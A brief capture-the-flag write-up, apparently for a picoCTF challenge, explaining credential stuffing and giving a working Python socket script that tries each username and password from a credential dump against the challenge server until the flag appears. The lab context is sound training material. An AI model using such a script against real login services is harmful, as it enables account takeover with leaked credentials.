# URL
https://learn.cylabacademy.org/library/749
# Concept
* credential stuffing
# Method of solve
* we are given a list of credentials to try to login to an app
* since the app being used is not web-based, we use a Python script to automate the process:
```Python
import socket

port = 62405 # fill this in
host = "crystal-peak.picoctf.net" # fill this in

credentials = {}

def talk_to_server(host, port, username, password):
  global flag
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    data1 = s.recv(1024)
    print(data1)

    s.sendall((username + "\n").encode())
    data2 = s.recv(1024)
    print(data2)

    s.sendall((password + "\n").encode())
    data3 = s.recv(1024)
    print(data3)

    data4 = s.recv(1024)
    print(data4)

    if b"picoCTF" in data4:
      flag = data4
      with open("flag.txt", "wb") as f:
        f.write(data4)

# read in the creds-dump.txt file and populate the credentials dictionary
with open("creds-dump.txt", "r", encoding="utf-8") as f:
  for line_num, line in enumerate(f, start=1):
    line = line.strip()
    parts = line.split(";", 1)  # split on first semicolon only
    username, password = parts
    credentials[username] = password

for username, password in credentials.items():
    talk_to_server(host, port, username, password)
```

